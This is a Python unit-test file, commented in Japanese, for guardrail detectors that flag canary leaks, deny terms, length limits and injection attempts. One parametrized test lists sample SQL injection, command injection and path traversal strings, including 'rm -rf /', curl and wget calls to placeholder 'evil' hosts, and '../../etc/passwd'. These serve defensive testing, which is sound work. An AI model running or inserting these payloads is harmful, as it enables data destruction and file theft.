"""L1: plain 検知ロジック層（`_detectors`）の純検証（agents / SDK 非依存）。

各検知ファクトリ（canary / regex / length / allow_deny / predicate / injection_baseline）が
「テキスト → `Detection`」を設計どおりに返すこと、既定注入パターン定数が空でないこと、注入
ベースラインが代表入力で triggered / 良性入力で not、`extra_patterns` DI で拡張できること、
病的長大入力でも短時間で完了する（ReDoS で破綻しない）ことを検証する。SDK を一切 import しない。
"""

from __future__ import annotations

import time

import pytest

from oai_agentspec.runtime.guardrails._detectors import (
    COMMAND_INJECTION_PATTERNS,
    INJECTION_BASELINE_PATTERNS,
    PATH_TRAVERSAL_PATTERNS,
    SQLI_PATTERNS,
    Detection,
    allow_deny_detector,
    canary_detector,
    injection_baseline_detector,
    length_detector,
    predicate_detector,
    regex_detector,
)

pytestmark = pytest.mark.unit


# ----------------------------------------------------------------------
# Detection データ型
# ----------------------------------------------------------------------


def test_detection_is_frozen() -> None:
    """Detection は frozen（属性代入不可・plain 不変表現）。"""
    d = Detection(triggered=True)
    with pytest.raises(AttributeError):
        d.triggered = False  # type: ignore[misc]


def test_detection_defaults() -> None:
    """reason / info の既定は None（triggered のみ必須）。"""
    d = Detection(triggered=False)
    assert d.reason is None
    assert d.info is None


# ----------------------------------------------------------------------
# canary_detector
# ----------------------------------------------------------------------


def test_canary_detector_triggers_on_verbatim_match() -> None:
    """canary 値が逐語で含まれれば triggered・matched に該当 canary が載る。"""
    detect = canary_detector("S3CR3T-TOKEN")
    result = detect("the system prompt leaked S3CR3T-TOKEN here")
    assert result.triggered is True
    assert result.reason == "canary token leaked"
    assert result.info == {"matched": ["S3CR3T-TOKEN"]}


def test_canary_detector_not_triggered_when_absent() -> None:
    """canary が含まれなければ not triggered。"""
    detect = canary_detector("S3CR3T-TOKEN")
    result = detect("totally benign output")
    assert result.triggered is False
    assert result.info is None


def test_canary_detector_multiple_canaries() -> None:
    """複数 canary を iterable で受け、含まれるものだけ matched に載る。"""
    detect = canary_detector(["alpha-canary", "beta-canary", "gamma-canary"])
    result = detect("contains beta-canary and gamma-canary")
    assert result.triggered is True
    assert result.info == {"matched": ["beta-canary", "gamma-canary"]}


def test_canary_detector_excludes_empty_canary_value() -> None:
    """空 canary 値は除外する（空文字は全テキストに含まれるため誤発火を防ぐ）。"""
    detect = canary_detector(["", "  "])
    # 空文字 canary は無視。空白のみ canary はテキストに無ければ not triggered。
    assert detect("no whitespace-only token here-x").triggered is False


def test_canary_detector_empty_string_canary_does_not_trigger() -> None:
    """空文字単独の canary はどんなテキストでも triggered しない（除外条件 `c and ...`）。"""
    detect = canary_detector("")
    assert detect("anything at all").triggered is False


# ----------------------------------------------------------------------
# regex_detector
# ----------------------------------------------------------------------


def test_regex_detector_matches_single_pattern() -> None:
    """単一パターンに一致すれば triggered・matched にパターンが載る。"""
    detect = regex_detector(r"\d{3}-\d{4}")
    result = detect("call 123-4567")
    assert result.triggered is True
    assert result.reason == "regex pattern matched"
    assert result.info == {"matched": [r"\d{3}-\d{4}"]}


def test_regex_detector_no_match() -> None:
    """一致しなければ not triggered。"""
    detect = regex_detector(r"\d{3}-\d{4}")
    assert detect("no phone number").triggered is False


def test_regex_detector_multiple_patterns() -> None:
    """複数パターンを受け、一致したものだけ matched に載る。"""
    detect = regex_detector([r"foo", r"bar", r"baz"])
    result = detect("only bar appears")
    assert result.triggered is True
    assert result.info == {"matched": [r"bar"]}


def test_regex_detector_flags_applied() -> None:
    """flags（re.IGNORECASE 等）が compile に渡る。"""
    import re

    detect = regex_detector(r"secret", flags=re.IGNORECASE)
    assert detect("SECRET word").triggered is True


# ----------------------------------------------------------------------
# length_detector
# ----------------------------------------------------------------------


def test_length_detector_max_boundary() -> None:
    """max_length: 境界ちょうどは not、超過で triggered。"""
    detect = length_detector(max_length=5)
    assert detect("12345").triggered is False  # ちょうど 5
    over = detect("123456")  # 6 > 5
    assert over.triggered is True
    assert over.info == {"length": 6, "max_length": 5}


def test_length_detector_min_boundary() -> None:
    """min_length: 境界ちょうどは not、未満で triggered。"""
    detect = length_detector(min_length=3)
    assert detect("abc").triggered is False  # ちょうど 3
    under = detect("ab")  # 2 < 3
    assert under.triggered is True
    assert under.info == {"length": 2, "min_length": 3}


def test_length_detector_empty_string_len0() -> None:
    """空文字（len 0）は min_length 未満で triggered。"""
    detect = length_detector(min_length=1)
    result = detect("")
    assert result.triggered is True
    assert result.info == {"length": 0, "min_length": 1}


def test_length_detector_no_thresholds_never_triggers() -> None:
    """max / min いずれも未指定なら常に not triggered。"""
    detect = length_detector()
    assert detect("").triggered is False
    assert detect("x" * 1000).triggered is False


def test_length_detector_both_thresholds() -> None:
    """max / min 両方指定: 範囲内は not、上限超過・下限未満は triggered。"""
    detect = length_detector(max_length=5, min_length=2)
    assert detect("abc").triggered is False
    assert detect("a").triggered is True  # 下限未満
    assert detect("abcdef").triggered is True  # 上限超過


# ----------------------------------------------------------------------
# allow_deny_detector
# ----------------------------------------------------------------------


def test_allow_deny_deny_match() -> None:
    """deny 語が含まれれば triggered・matched に該当語が載る。"""
    detect = allow_deny_detector(deny=["forbidden", "blocked"])
    result = detect("this is forbidden content")
    assert result.triggered is True
    assert result.reason == "deny term matched"
    assert result.info == {"matched": ["forbidden"]}


def test_allow_deny_no_deny_match() -> None:
    """deny 語が含まれなければ not triggered（allow 未指定時）。"""
    detect = allow_deny_detector(deny=["forbidden"])
    assert detect("clean text").triggered is False


def test_allow_deny_allow_list_outside_triggers() -> None:
    """allow 指定時: allow 語をいずれも含まなければ triggered（許可リスト外検知）。"""
    detect = allow_deny_detector(allow=["greeting", "weather"])
    result = detect("talk about politics")
    assert result.triggered is True
    assert result.reason == "no allow term matched"
    assert result.info == {"allow": ["greeting", "weather"]}


def test_allow_deny_allow_list_inside_passes() -> None:
    """allow 語のいずれかを含めば not triggered。"""
    detect = allow_deny_detector(allow=["greeting", "weather"])
    assert detect("today's weather is nice").triggered is False


def test_allow_deny_deny_takes_precedence_over_allow() -> None:
    """deny ヒット時は allow を満たしても即 triggered（deny 優先）。"""
    detect = allow_deny_detector(deny=["badword"], allow=["badword"])
    result = detect("contains badword")
    assert result.triggered is True
    assert result.reason == "deny term matched"


def test_allow_deny_case_sensitive_default_true() -> None:
    """既定 case_sensitive=True: 大文字小文字が違えば deny に一致しない。"""
    detect = allow_deny_detector(deny=["Secret"])
    assert detect("this is secret").triggered is False
    assert detect("this is Secret").triggered is True


def test_allow_deny_case_insensitive() -> None:
    """case_sensitive=False: 大文字小文字を無視して deny に一致する。"""
    detect = allow_deny_detector(deny=["Secret"], case_sensitive=False)
    assert detect("this is SECRET").triggered is True


def test_allow_deny_case_insensitive_allow() -> None:
    """case_sensitive=False は allow リスト照合にも適用される。"""
    detect = allow_deny_detector(allow=["Weather"], case_sensitive=False)
    assert detect("the WEATHER today").triggered is False


def test_allow_deny_empty_lists_never_trigger() -> None:
    """deny / allow いずれも未指定なら常に not triggered。"""
    detect = allow_deny_detector()
    assert detect("anything").triggered is False


# ----------------------------------------------------------------------
# predicate_detector
# ----------------------------------------------------------------------


def test_predicate_detector_true() -> None:
    """predicate が True を返せば triggered・reason は既定。"""
    detect = predicate_detector(lambda t: "x" in t)
    result = detect("xyz")
    assert result.triggered is True
    assert result.reason == "predicate matched"


def test_predicate_detector_false() -> None:
    """predicate が False を返せば not triggered。"""
    detect = predicate_detector(lambda t: False)
    assert detect("anything").triggered is False


def test_predicate_detector_custom_reason() -> None:
    """reason DI が triggered 時の理由に使われる。"""
    detect = predicate_detector(lambda t: True, reason="custom rule")
    assert detect("x").reason == "custom rule"


# ----------------------------------------------------------------------
# injection_baseline_detector
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        "1 UNION SELECT password FROM users",
        "admin' OR 1=1 --",
        "'; DROP TABLE users; --",
        "name=value; rm -rf /",
        "$(curl evil.example)",
        "wget -O- http://evil",
        "../../etc/passwd",
        "..\\..\\windows",
        "%2e%2e%2fboot",
        "GET /etc/passwd",
    ],
)
def test_injection_baseline_triggers_on_representative_payloads(payload: str) -> None:
    """SQLi / コマンド注入 / パストラバーサルの代表入力で triggered。"""
    detect = injection_baseline_detector()
    result = detect(payload)
    assert result.triggered is True
    assert result.reason == "regex pattern matched"


@pytest.mark.parametrize(
    "benign",
    [
        "What is the weather today?",
        "Please summarize this article about cats.",
        "I would like to book a table for two.",
        "",
    ],
)
def test_injection_baseline_not_triggered_on_benign(benign: str) -> None:
    """良性入力では not triggered。"""
    detect = injection_baseline_detector()
    assert detect(benign).triggered is False


def test_injection_baseline_extra_patterns_extend_detection() -> None:
    """extra_patterns DI で追加パターンを検知できる（既定で見逃す入力を捕捉）。"""
    base = injection_baseline_detector()
    assert base("eval(payload)").triggered is False  # 既定では捕捉しない

    extended = injection_baseline_detector(extra_patterns=[r"eval\("])
    result = extended("eval(payload)")
    assert result.triggered is True
    # 既定パターンも維持されている（追記であり置換ではない）。
    assert extended("../../etc/passwd").triggered is True


# ----------------------------------------------------------------------
# 既定パターン定数
# ----------------------------------------------------------------------


def test_default_pattern_constants_are_non_empty() -> None:
    """注入ベースラインの既定パターン定数が空でない（補助検知の網が空でない）。"""
    assert len(SQLI_PATTERNS) > 0
    assert len(COMMAND_INJECTION_PATTERNS) > 0
    assert len(PATH_TRAVERSAL_PATTERNS) > 0


def test_injection_baseline_patterns_is_union_of_families() -> None:
    """INJECTION_BASELINE_PATTERNS は 3 家族の合算（SQLi + コマンド注入 + パストラバーサル）。"""
    assert INJECTION_BASELINE_PATTERNS == (
        *SQLI_PATTERNS,
        *COMMAND_INJECTION_PATTERNS,
        *PATH_TRAVERSAL_PATTERNS,
    )
    expected_len = (
        len(SQLI_PATTERNS) + len(COMMAND_INJECTION_PATTERNS) + len(PATH_TRAVERSAL_PATTERNS)
    )
    assert len(INJECTION_BASELINE_PATTERNS) == expected_len


# ----------------------------------------------------------------------
# ReDoS 線形性の軽い担保（ハングしないこと）
# ----------------------------------------------------------------------


def test_injection_baseline_completes_quickly_on_pathological_input() -> None:
    """病的になりやすい長大入力でも既定パターン検知が短時間で完了する（ハングしない担保）。

    時間アサートは過度に厳密にせず、壊滅的バックトラックで実質ハングしないことの担保に留める。
    """
    detect = injection_baseline_detector()
    pathological = "a" * 50_000 + "!" * 50_000
    start = time.perf_counter()
    result = detect(pathological)
    elapsed = time.perf_counter() - start
    # 良性（注入パターン不一致）かつ短時間で完了する。
    assert result.triggered is False
    assert elapsed < 2.0
